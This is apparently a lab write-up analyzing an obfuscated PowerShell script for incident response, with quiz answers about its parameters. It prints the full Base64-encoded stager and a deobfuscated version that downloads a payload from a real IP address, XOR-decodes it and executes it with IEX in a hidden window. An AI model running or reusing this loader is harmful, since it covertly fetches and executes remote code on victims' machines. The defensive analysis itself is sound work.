---
layout : post
title: Powershell_Code_obfuscation
image : Powershell.png
date: 2024-04-10 10:18 +0530
tags: [Base64 ,Powershell ,Incident Response, Deobfuscate ] 
---

### Scenario

Incident response team reported malicious PowerShell code for deobfuscation, seemingly laced with malicious intent. Your mission, should you choose to accept it, is to dissect and analyze this script, unveiling its true nature and potential risks. Dive into the code and reveal its secrets to safeguard our digital realm.

![]({{site.baseurl}}/img/Letsdefence/Powershell IR/Power-shell.jpeg)

Deobfuscating the code allows for a deeper understanding of the attacker's techniques and aids in identifying indicators of compromise (IOCs) [Reference: MITRE ATT&CK ](https://attack.mitre.org/techniques/T1140/)

### Reported Powershell Script 

```powershell
powershell.exe -NoP -sta -NonI -W Hidden -Enc
JABXAEMAPQBOAGUAdwAtAE8AYgBqAEUAYwBUACAAUwB5AFMAVABlAE0ALgBOAEUAVAAuAFcAZQBiAEMAbABpAEUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAEEARABlAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAG8AeABZACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFcARQBCAFIAZQBRAFUARQBzAHQAXQA6ADoARABFAEYAQQB1AEwAdABXAGUAYgBQAHIAbwBYAHkAOwAkAHcAYwAuAFAAUgBPAHgAWQAuAEMAcgBFAGQAZQBuAFQAaQBhAGwAUwAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBFAHQALgBDAFIAZQBkAGUATgBUAEkAQQBsAEMAQQBjAEgARQBdADoAOgBEAGUARgBBAFUATABUAE4AZQB0AFcATwByAEsAQwByAGUAZABFAE4AVABpAEEAbABzADsAJABLAD0AJwBJAE0ALQBTACYAZgBBADkAWAB1AHsAWwApAHwAdwBkAFcASgBoAEMAKwAhAE4AfgB2AHEAXwAxADIATAB0AHkAJwA7ACQAaQA9ADAAOwBbAEMASABhAFIAWwBdAF0AJABCAD0AKABbAGMASABhAFIAWwBdAF0AKAAkAHcAYwAuAEQATwB3AE4ATABPAGEARABTAHQAcgBpAE4AZwAoACIAaAB0AHQAcAA6AC8ALwA5ADgALgAxADAAMwAuADEAMAAzAC4AMQA3ADAAOgA3ADQANAAzAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgAbwBSACQASwBbACQASQArACsAJQAkAGsALgBMAEUAbgBHAFQASABdAH0AOwBJAEUAWAAgACgAJABCAC0AagBPAEkAbgAnACcAKQA=
```
The encoded script likely represents Base64 encoding, a common technique used by attackers to obfuscate malicious payloads. Decoding the script using tools like CyberChef can reveal the underlying commands and intentions of the attacker.

![]({{site.baseurl}}/img/Letsdefence/Powershell IR/Base64 decode.png)

Now that we have decoded the script, we may encounter visual text interspersed with null bytes. These null bytes can be removed using the "Remove Null Bytes" operation in tools like CyberChef.

![]({{site.baseurl}}/img/Letsdefence/Powershell IR/Remove Null bytes.png)

### Q1.What encoding is the malicious script using?

```text
Base64
```

### Q2.What parameter in the powershell script makes it so that the powershell window is hidden when executed?
```powershell
-W Hidden
```
### Q3.What parameter in the Powershell script prevents the user from closing the process?
```powershell
-NonI
```
### Q4.What line of code allows the script to interact with websites and retrieve information from them?

```powershell
$WC=New-Object System.Net.WebClient
```
### Q5.What is the user agent string that is being spoofed in the malicious script?

```powershell 
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
```

### Q6.What line of code is used to set the proxy credentials for authentication in the script?

```Powershell
$wc.PROxY.CrEdenTialS = [SysTem.NEt.CRedeNTIAlCAcHE]::DeFAULTNetWOrKCredENTiAls
```

### Q7.When the malicious script is executed, what is the URL that the script contacts to download the malicious payload?

```powershell
http://98.103.103.170:7443/index.asp
```
here is the de

```powershell
powershell.exe -NoP -sta -NonI -W Hidden -Enc
$web_client=New-ObjEcT SySTeM.NET.WebCliENt;
$user_agent='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$web_client.HeADeRS.ADd('User-Agent',$user_agent);
$web_client.ProxY = [System.NeT.WEBReQUEst]::DEFAuLtWebProXy;
$web_client.PROxY.CrEdenTialS = [SysTem.NEt.CRedeNTIAlCAcHE]::DeFAULTNetWOrKCredENTiAls;
$Password='IM-S&fA9Xu{[)|wdWJhC+!N~vq_12Lty';
$i=0;[CHaR[]]
$Payload=
	(
		[cHaR[]]
		($web_client.DOwNLOaDStriNg("http://98.103.103.170:7443/index.asp"))
	)
	|%{$_-BXoR$Password[$I++%$Password.LEnGTH]};

IEX ($Payload-jOIn'')

```

### Summary 
